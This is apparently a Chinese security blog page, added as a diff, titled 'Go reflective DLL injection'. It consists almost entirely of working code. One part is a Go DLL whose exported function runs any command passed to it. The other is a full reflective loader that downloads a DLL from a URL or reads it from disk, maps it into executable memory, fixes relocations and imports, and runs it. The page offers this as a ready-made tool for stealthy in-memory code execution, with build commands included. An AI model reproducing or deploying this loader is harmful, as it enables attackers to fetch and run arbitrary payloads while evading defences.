@@ -1,0 +1,677 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>GO 反射DLL注入 | CXAQHQ</title>
+<link rel="shortcut icon" href="https://blog.cxaqhq.cn/favicon.ico?v=1744037624894">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://blog.cxaqhq.cn/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="GO 反射DLL注入 | CXAQHQ - Atom Feed" href="https://blog.cxaqhq.cn/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="Golang DLL  代码
+// mirage.go
+package main
+
+/*
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+// 声明导出函数
+__declspec(dl..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://blog.cxaqhq.cn">
+  <img class="avatar" src="https://blog.cxaqhq.cn/images/avatar.png?v=1744037624894" alt="">
+  </a>
+  <h1 class="site-title">
+    CXAQHQ
+  </h1>
+  <p class="site-description">
+    再努力一点！
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/badboycxcc" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+        <a href="https://twitter.com/cxaqhq" target="_blank">
+          <i class="ri-twitter-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              GO 反射DLL注入
+            </h2>
+            <div class="post-info">
+              <span>
+                2025-01-08
+              </span>
+              <span>
+                14 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h2 id="golang-dll-代码">Golang DLL  代码</h2>
+<pre><code class="language-golang">// mirage.go
+package main
+
+/*
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+
+// 声明导出函数
+__declspec(dllexport) void mirage(const char* cmd) {
+		printf(cmd);
+        system(cmd);
+}
+*/
+import &quot;C&quot;
+
+func main() {
+}
+</code></pre>
+<p>编译DLL 方法</p>
+<pre><code class="language-powershell">$env:CGO_ENABLED=&quot;1&quot;   
+go build -o mirage.dll -buildmode=c-shared mirage.go
+</code></pre>
+<h2 id="golang-reflective-inject">Golang Reflective Inject</h2>
+<pre><code class="language-golang">package main
+
+import (
+	&quot;bytes&quot;
+	&quot;encoding/binary&quot;
+	&quot;flag&quot;
+	&quot;fmt&quot;
+	&quot;golang.org/x/sys/windows&quot;
+	&quot;io&quot;
+	&quot;log&quot;
+	&quot;net/http&quot;
+	&quot;net/url&quot;
+	&quot;os&quot;
+	&quot;strings&quot;
+	&quot;syscall&quot;
+	&quot;unsafe&quot;
+)
+
+// IMAGE_OPTIONAL_HEADER64 表示适用于64位架构的可选PE头结构。
+type IMAGE_OPTIONAL_HEADER64 struct {
+	Magic                       uint16                   // 文件的魔数标志，用于识别PE文件。
+	MajorLinkerVersion          uint8                    // 链接器主版本号。
+	MinorLinkerVersion          uint8                    // 链接器次版本号。
+	SizeOfCode                  uint32                   // 代码段的大小。
+	SizeOfInitializedData       uint32                   // 已初始化数据段的大小。
+	SizeOfUninitializedData     uint32                   // 未初始化数据段的大小。
+	AddressOfEntryPoint         uint32                   // 程序入口点的RVA（相对虚拟地址）。
+	BaseOfCode                  uint32                   // 代码段的起始地址。
+	ImageBase                   uint64                   // 文件加载到内存后的首地址。
+	SectionAlignment            uint32                   // 内存中段对齐的粒度。
+	FileAlignment               uint32                   // 文件中段对齐的粒度。
+	MajorOperatingSystemVersion uint16                   // 支持的操作系统主版本号。
+	MinorOperatingSystemVersion uint16                   // 支持的操作系统次版本号。
+	MajorImageVersion           uint16                   // 文件主版本号。
+	MinorImageVersion           uint16                   // 文件次版本号。
+	MajorSubsystemVersion       uint16                   // 子系统的主版本号。
+	MinorSubsystemVersion       uint16                   // 子系统的次版本号。
+	Win32VersionValue           uint32                   // 保留字段，通常为0。
+	SizeOfImage                 uint32                   // 映像文件大小。
+	SizeOfHeaders               uint32                   // 所有头和表的大小。
+	CheckSum                    uint32                   // 校验和。
+	Subsystem                   uint16                   // 子系统类型。
+	DllCharacteristics          uint16                   // DLL的特性标志。
+	SizeOfStackReserve          uint64                   // 保留的堆栈大小。
+	SizeOfStackCommit           uint64                   // 提交的堆栈大小。
+	SizeOfHeapReserve           uint64                   // 保留的堆大小。
+	SizeOfHeapCommit            uint64                   // 提交的堆大小。
+	LoaderFlags                 uint32                   // 加载标志（已废弃）。
+	NumberOfRvaAndSizes         uint32                   // 数据目录数量。
+	DataDirectory               [16]IMAGE_DATA_DIRECTORY // 数据目录。
+}
+
+// IMAGE_DATA_DIRECTORY 表示数据目录条目。
+type IMAGE_DATA_DIRECTORY struct {
+	VirtualAddress uint32 // 数据目录的起始地址（RVA）。
+	Size           uint32 // 数据目录的大小。
+}
+
+// IMAGE_FILE_HEADER 表示文件头结构。
+type IMAGE_FILE_HEADER struct {
+	Machine              uint16 // 目标机器类型（例如x64）。
+	NumberOfSections     uint16 // 段数量。
+	TimeDateStamp        uint32 // 文件创建时间戳。
+	PointerToSymbolTable uint32 // 符号表的指针（已废弃）。
+	NumberOfSymbols      uint32 // 符号数量（已废弃）。
+	SizeOfOptionalHeader uint16 // 可选头的大小。
+	Characteristics      uint16 // 文件特性标志。
+}
+
+// IMAGE_NT_HEADERS64 表示PE文件的NT头（适用于64位）。
+type IMAGE_NT_HEADERS64 struct {
+	Signature      uint32                  // 签名（通常为 &quot;PE\0\0&quot;）。
+	FileHeader     IMAGE_FILE_HEADER       // 文件头。
+	OptionalHeader IMAGE_OPTIONAL_HEADER64 // 可选头（适用于64位）。
+}
+
+// IMAGE_SECTION_HEADER 表示段头。
+type IMAGE_SECTION_HEADER struct {
+	Name                 [8]byte // 段名称。
+	VirtualSize          uint32  // 段的内存大小。
+	VirtualAddress       uint32  // 段的内存RVA。
+	SizeOfRawData        uint32  // 段在文件中的大小。
+	PointerToRawData     uint32  // 段在文件中的偏移。
+	PointerToRelocations uint32  // 重定位表的偏移（已废弃）。
+	PointerToLinenumbers uint32  // 行号表的偏移（已废弃）。
+	NumberOfRelocations  uint16  // 重定位数量（已废弃）。
+	NumberOfLinenumbers  uint16  // 行号数量（已废弃）。
+	Characteristics      uint32  // 段特性标志。
+}
+
+// BASE_RELOCATION_BLOCK 表示重定位块结构。
+type BASE_RELOCATION_BLOCK struct {
+	PageAddress uint32 // 重定位块所在页的起始地址。
+	BlockSize   uint32 // 重定位块的大小。
+}
+
+// BASE_RELOCATION_ENTRY 表示单个重定位条目。
+type BASE_RELOCATION_ENTRY struct {
+	OffsetType uint16 // 偏移和类型的组合字段。
+}
+
+// Offset 从组合字段中提取偏移量。
+func (bre BASE_RELOCATION_ENTRY) Offset() uint16 {
+	return bre.OffsetType &amp; 0xFFF
+}
+
+// Type 从组合字段中提取类型。
+func (bre BASE_RELOCATION_ENTRY) Type() uint16 {
+	return (bre.OffsetType &gt;&gt; 12) &amp; 0xF
+}
+
+// ImageExportDirectory找出在DLL中的所有导出函数
+type ImageExportDirectory struct {
+	Characteristics       uint32
+	TimeDateStamp         uint32
+	MajorVersion          uint16
+	MinorVersion          uint16
+	Name                  uint32
+	Base                  uint32
+	NumberOfFunctions     uint32
+	NumberOfNames         uint32
+	AddressOfFunctions    uint32
+	AddressOfNames        uint32
+	AddressOfNameOrdinals uint32
+}
+
+// IMAGE_IMPORT_DESCRIPTOR 表示导入表的描述符。
+type IMAGE_IMPORT_DESCRIPTOR struct {
+	Characteristics uint32 // 描述符的特性。
+	TimeDateStamp   uint32 // 时间戳。
+	ForwarderChain  uint32 // 转发链。
+	Name            uint32 // 导入DLL名称的RVA。
+	FirstThunk      uint32 // 首个IAT表项的RVA。
+}
+
+// uintptrToBytes 将uintptr转换为字节数组。
+func uintptrToBytes(ptr uintptr) []byte {
+	ptrPtr := unsafe.Pointer(&amp;ptr) // 获取指针的指针。
+	byteSlice := make([]byte, unsafe.Sizeof(ptr))
+	for i := 0; i &lt; int(unsafe.Sizeof(ptr)); i++ {
+		byteSlice[i] = *(*byte)(unsafe.Pointer(uintptr(ptrPtr) + uintptr(i)))
+	}
+	return byteSlice
+}
+func cStringToGoString(cstr *byte) string {
+	bytes := []byte{}
+	for {
+		b := *cstr
+		if b == 0 {
+			break
+		}
+		bytes = append(bytes, b)
+		cstr = (*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(cstr)) + 1))
+	}
+	return string(bytes)
+}
+
+// 常量定义。
+const (
+	IMAGE_DIRECTORY_ENTRY_IMPORT    = 0x1 // 导入表的目录索引。
+	IMAGE_DIRECTORY_ENTRY_BASERELOC = 0x5 // 重定位表的目录索引。
+	DLL_PROCESS_ATTACH              = 0x1 // DLL加载时的附加标志。
+)
+
+func DownloadDLL(url string) ([]byte, error) {
+	resp, err := http.Get(url)
+	if err != nil {
+		return nil, err
+	}
+	defer resp.Body.Close()
+
+	buf := new(bytes.Buffer)
+	_, err = io.Copy(buf, resp.Body)
+	if err != nil {
+		return nil, err
+	}
+
+	return buf.Bytes(), nil
+}
+
+func isURL(str string) bool {
+	parsedURL, err := url.Parse(str)
+	if err != nil {
+		return false
+	}
+	// 检查 URL 是否包含 Scheme 和 Host
+	return parsedURL.Scheme != &quot;&quot; &amp;&amp; parsedURL.Host != &quot;&quot;
+}
+
+func LoadDll(filepath, inputFuncName string, args []string) {
+	// 输出一个空行，方便格式化日志输出
+	fmt.Println()
+	var dllBytes []byte
+	// 读取DLL文件内容到字节切片中
+
+	if isURL(filepath) {
+		dllBytes, _ = DownloadDLL(filepath)
+	} else {
+		dllBytes, _ = os.ReadFile(filepath)
+	}
+
+	// 将DLL字节切片的起始地址转为uintptr，用于后续内存操作
+	dllPtr := uintptr(unsafe.Pointer(&amp;dllBytes[0]))
+	fmt.Printf(&quot;[+] DLL of size %d is loaded in memory at 0x%x\n&quot;, len(dllBytes), dllPtr)
+
+	// 获取PE头的偏移量（e_lfanew），用来定位PE文件的NT头
+	e_lfanew := *((*uint32)(unsafe.Pointer(dllPtr + 0x3c)))
+
+	// 使用偏移量获取PE的NT头地址并转为IMAGE_NT_HEADERS64结构
+	nt_header := (*IMAGE_NT_HEADERS64)(unsafe.Pointer(dllPtr + uintptr(e_lfanew)))
+
+	// 为DLL分配内存空间
+	dllBase, err := windows.VirtualAlloc(uintptr(nt_header.OptionalHeader.ImageBase),
+		uintptr(nt_header.OptionalHeader.SizeOfImage),
+		windows.MEM_RESERVE|windows.MEM_COMMIT,
+		windows.PAGE_EXECUTE_READWRITE,
+	)
+	if err != nil {
+		log.Fatalf(&quot;[!] VirtualAlloc Failed&quot;)
+	}
+
+	// 打印分配的基址
+	fmt.Printf(&quot;[+] Allocated address at 0x%x\n\n&quot;, dllBase)
+
+	// 计算加载基址的差值，用于重定位修正
+	deltaImageBase := dllBase - uintptr(nt_header.OptionalHeader.ImageBase)
+
+	// 将PE头拷贝到目标内存地址
+	var numberOfBytesWritten uintptr
+	err = windows.WriteProcessMemory(windows.CurrentProcess(), dllBase, &amp;dllBytes[0], uintptr(nt_header.OptionalHeader.SizeOfHeaders), &amp;numberOfBytesWritten)
+	if err != nil {
+		log.Fatalf(&quot;[!] WriteProcessMemory Failed&quot;)
+	}
+
+	// 获取PE文件中的段数量
+	numberOfSections := int(nt_header.FileHeader.NumberOfSections)
+
+	// 计算段表的起始地址
+	sectionAddr := dllPtr + uintptr(e_lfanew) + unsafe.Sizeof(nt_header.Signature) + unsafe.Sizeof(nt_header.OptionalHeader) + unsafe.Sizeof(nt_header.FileHeader)
+
+	// 遍历所有段并将它们拷贝到目标内存
+	for i := 0; i &lt; numberOfSections; i++ {
+		// 获取当前段的结构信息
+		section := (*IMAGE_SECTION_HEADER)(unsafe.Pointer(sectionAddr))
+
+		// 计算段的目标地址和数据源地址
+		sectionDestination := dllBase + uintptr(section.VirtualAddress)
+		sectionBytes := (*byte)(unsafe.Pointer(dllPtr + uintptr(section.PointerToRawData)))
+
+		// 打印段拷贝信息
+		fmt.Printf(&quot;[+] Copying %d bytes from 0x%x -&gt; 0x%x for section : %s\n&quot;,
+			section.SizeOfRawData, dllPtr+uintptr(section.PointerToRawData), sectionDestination, windows.ByteSliceToString(section.Name[:]))
+
+		// 将段数据拷贝到目标内存
+		err = windows.WriteProcessMemory(windows.CurrentProcess(), sectionDestination, sectionBytes, uintptr(section.SizeOfRawData), &amp;numberOfBytesWritten)
+		if err != nil {
+			log.Fatalf(&quot;[!] WriteProcessMemory Failed: %v \n&quot;, err)
+		}
+
+		// 如果当前段是代码段（.text），修改其权限为可执行
+		if windows.ByteSliceToString(section.Name[:]) == &quot;.text&quot; {
+			var oldprotect uint32
+			err := windows.VirtualProtect(sectionDestination, uintptr(section.SizeOfRawData), windows.PAGE_EXECUTE_READ, &amp;oldprotect)
+			if err != nil {
+				log.Fatalln(&quot;[ERROR] Failed to change memory permissions&quot;)
+			}
+		}
+
+		// 移动到下一个段
+		sectionAddr += unsafe.Sizeof(*section)
+	}
+	fmt.Println()
+
+	// 获取重定位表信息
+	relocations := nt_header.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]
+	relocation_table := uintptr(relocations.VirtualAddress) + dllBase
+	fmt.Printf(&quot;[+] Relocation table Address: 0x%x\n\n&quot;, relocation_table)
+
+	// 遍历重定位表并修正所有地址
+	var relocations_processed int
+	for {
+		// 读取当前的重定位块
+		relocation_block := *(*BASE_RELOCATION_BLOCK)(unsafe.Pointer(uintptr(relocation_table + uintptr(relocations_processed))))
+
+		// 如果重定位块的大小为0，则结束循环
+		if relocation_block.BlockSize == 0 &amp;&amp; relocation_block.PageAddress == 0 {
+			break
+		}
+
+		// 计算当前块中的重定位条目数量
+		relocationsCount := (relocation_block.BlockSize - 8) / 2
+		fmt.Printf(&quot;[+] PAGERVA : 0x%04x   Size: 0x%02x Entries Count: 0x%02x\n&quot;, relocation_block.PageAddress, relocation_block.BlockSize, relocationsCount)
+
+		// 遍历所有重定位条目并修正地址
+		for i := 0; i &lt; int(relocationsCount); i++ {
+			// 读取重定位条目并解析偏移和类型
+			relocEntry := relocation_table + uintptr(relocations_processed) + 8 + uintptr(i*2)
+			entry := *(*BASE_RELOCATION_ENTRY)(unsafe.Pointer(relocEntry))
+
+			// 跳过类型为0的条目
+			if entry.Type() == 0 {
+				continue
+			}
+
+			// 读取当前地址值并应用基址修正
+			relocationRVA := relocation_block.PageAddress + uint32(entry.Offset())
+			var originalValue uintptr
+			byteSlice := make([]byte, unsafe.Sizeof(originalValue))
+			err = windows.ReadProcessMemory(windows.CurrentProcess(), dllBase+uintptr(relocationRVA), &amp;byteSlice[0], unsafe.Sizeof(originalValue), nil)
+			if err != nil {
+				log.Fatalf(&quot;[ERROR] Failed to ReadProcessMemory&quot;)
+			}
+			addressToPatch := uintptr(binary.LittleEndian.Uint64(byteSlice))
+			addressToPatch += deltaImageBase
+			a2Patch := uintptrToBytes(addressToPatch)
+			err = windows.WriteProcessMemory(windows.CurrentProcess(), dllBase+uintptr(relocationRVA), &amp;a2Patch[0], uintptr(len(a2Patch)), nil)
+			if err != nil {
+				log.Fatalf(&quot;[ERROR] Failed to WriteProcessMemory&quot;)
+			}
+		}
+
+		// 更新已处理的字节数
+		relocations_processed += int(relocation_block.BlockSize)
+	}
+	var targetFuncAddr uintptr
+	if inputFuncName != &quot;&quot; {
+		// 遍历导出地址表，方便调用
+		// 在OptionalHeader中读取数据目录中导出表的所在位置，这里直接取了0，即第一个元素就是导出表的起始位置，如果要找导入表，则填8
+		// 这个位置加上dllBase就能够找到在内存中的值，通过预设的ImageExportDirectory结构体还原导出表
+		exportDirectoryRVA := *(*uint32)(unsafe.Pointer(&amp;nt_header.OptionalHeader.DataDirectory[0]))
+		exportDirectory := (*ImageExportDirectory)(unsafe.Pointer(dllBase + uintptr(exportDirectoryRVA)))
+
+		// 读取导出函数的名称列表，函数序号表以及函数地址表
+		nameArray := (*[1 &lt;&lt; 20]uint32)(unsafe.Pointer(dllBase + uintptr(exportDirectory.AddressOfNames)))
+		ordinalArray := (*[1 &lt;&lt; 20]uint16)(unsafe.Pointer(dllBase + uintptr(exportDirectory.AddressOfNameOrdinals)))
+		functionArray := (*[1 &lt;&lt; 20]uint32)(unsafe.Pointer(dllBase + uintptr(exportDirectory.AddressOfFunctions)))
+
+		// NumberOfNames表示导出函数的数量
+		for i := 0; i &lt; int(exportDirectory.NumberOfNames); i++ {
+			// 读取第一个导出函数名称存放的内存地址，通过函数将指针指向的内容进行读取
+			nameRVA := nameArray[i]
+			name := (*byte)(unsafe.Pointer(dllBase + uintptr(nameRVA)))
+			funcName := cStringToGoString(name)
+			if funcName == inputFuncName {
+				// 找到函数地址
+				ordinal := ordinalArray[i]
+				funcRVA := functionArray[ordinal]
+				targetFuncAddr = dllBase + uintptr(funcRVA)
+				fmt.Printf(&quot;[+] Function '%s' found, address is %v\n&quot;, inputFuncName, targetFuncAddr)
+				break
+			}
+		}
+
+		if targetFuncAddr == 0 {
+			fmt.Printf(&quot;[DEBUG] Function '%s' not found\n&quot;, inputFuncName)
+			return
+		}
+	}
+
+	// 获取导入表信息
+	importsDirectory := nt_header.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]
+	importDescriptorAddr := dllBase + uintptr(importsDirectory.VirtualAddress)
+	fmt.Printf(&quot;[+] Import Descripton address: 0x%x\n\n&quot;, importDescriptorAddr)
+
+	// 遍历导入表并加载所有依赖DLL和函数
+	for {
+		// 读取导入描述符
+		importDescriptor := *(*IMAGE_IMPORT_DESCRIPTOR)(unsafe.Pointer(importDescriptorAddr))
+		if importDescriptor.Name == 0 {
+			break
+		}
+
+		// 加载依赖的DLL
+		libraryName := uintptr(importDescriptor.Name) + dllBase
+		dllName := windows.BytePtrToString((*byte)(unsafe.Pointer(libraryName)))
+		fmt.Printf(&quot;[+] Importing DLL : %s\n&quot;, dllName)
+		hLibrary, err := windows.LoadLibrary(dllName)
+		if err != nil {
+			log.Fatalln(&quot;[ERROR] LoadLibrary Failed&quot;)
+		}
+		// 遍历IAT（导入地址表），解析函数地址
+		addr := dllBase + uintptr(importDescriptor.FirstThunk)
+		for {
+			thunk := *(*uint32)(unsafe.Pointer(addr))
+			fmt.Printf(&quot;[DEBUG] Thunk Value: 0x%x\n&quot;, thunk)
+			if thunk == 0 {
+				break
+			}
+
+			// 获取函数名称并加载地址
+			functionNameAddr := dllBase + uintptr(thunk+2)
+			functionName := windows.BytePtrToString((*byte)(unsafe.Pointer(functionNameAddr)))
+			fmt.Printf(&quot;[+] functionName: %s\n&quot;, functionName)
+			proc, err := windows.GetProcAddress(hLibrary, functionName)
+			if err != nil {
+				log.Fatalln(&quot;[ERROR] Failed to GetProcAddress&quot;)
+			}
+			fmt.Printf(&quot;	--&gt; Importing Function %s -&gt; Addr: 0x%x\n&quot;, functionName, proc)
+
+			// 写入函数地址到导入地址表
+			procBytes := uintptrToBytes(proc)
+			var numberOfBytesWritten uintptr
+			err = windows.WriteProcessMemory(windows.CurrentProcess(), addr, &amp;procBytes[0], uintptr(len(procBytes)), &amp;numberOfBytesWritten)
+			if err != nil {
+				log.Fatalln(&quot;[ERROR] Failed to WriteProcessMemory&quot;)
+			}
+
+			// 移动到下一个函数
+			addr += 0x8
+		}
+
+		// 移动到下一个导入描述符
+		importDescriptorAddr += 0x14
+	}
+
+	//调用DLL的入口点函数
+	if targetFuncAddr != 0 {
+		var uintptrArgs []uintptr
+		for _, arg := range args {
+			cStr := syscall.StringBytePtr(arg) // 转换为 C 风格字符串
+			uintptrArgs = append(uintptrArgs, uintptr(unsafe.Pointer(cStr)))
+		}
+		syscall.SyscallN(targetFuncAddr, uintptrArgs...)
+		return
+	}
+	syscall.SyscallN(dllBase+uintptr(nt_header.OptionalHeader.AddressOfEntryPoint), dllBase, DLL_PROCESS_ATTACH, 0)
+	fmt.Println(&quot;[+] DLL function executed&quot;)
+	// 释放分配的内存
+	err = windows.VirtualFree(dllBase, 0x0, windows.MEM_RELEASE)
+	if err != nil {
+		log.Fatalln(&quot;[ERROR] Failed to Free Memory&quot;)
+	}
+	fmt.Printf(&quot;[+] Freed Memory at 0x%x\n&quot;, dllBase)
+}
+
+func main() {
+	dllPath := flag.String(&quot;f&quot;, &quot;&quot;, &quot;You can enter the location of the local DLL, or the remote HTTP address.&quot;)
+	funcName := flag.String(&quot;n&quot;, &quot;&quot;, &quot;The name of the exported function you want to call.&quot;)
+	argument := flag.String(&quot;a&quot;, &quot;&quot;, &quot;Optional argument string: If your dll function implements the addition of two parameters, you can pass the value in the -a 1,2 way.&quot;)
+
+	var args []string
+	// 解析命令行参数
+	flag.Parse()
+
+	// 检查 -f 是否提供
+	if *dllPath == &quot;&quot; {
+		fmt.Println(&quot;[-] Error: -f parameter is required&quot;)
+		flag.Usage()
+		os.Exit(1)
+	}
+
+	if *argument != &quot;&quot; {
+		args = strings.Split(*argument, &quot;,&quot;)
+	}
+
+	LoadDll(*dllPath, *funcName, args)
+}
+</code></pre>
+<h2 id="参考">参考</h2>
+<ul>
+<li>https://www.yuque.com/juwangyizhu</li>
+<li>https://www.yuque.com/juwangyizhu/fam58u/omvmdllnstviuzgz?singleDoc# 《PE文件结构》</li>
+</ul>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#golang-dll-%E4%BB%A3%E7%A0%81">Golang DLL  代码</a></li>
+<li><a href="#golang-reflective-inject">Golang Reflective Inject</a></li>
+<li><a href="#%E5%8F%82%E8%80%83">参考</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://blog.cxaqhq.cn/post/exchange-user-brute-gong-ju/">
+              <h3 class="post-title">
+                Exchange User Brute 工具
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Backdoor
+  <a class="rss" href="https://blog.cxaqhq.cn/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
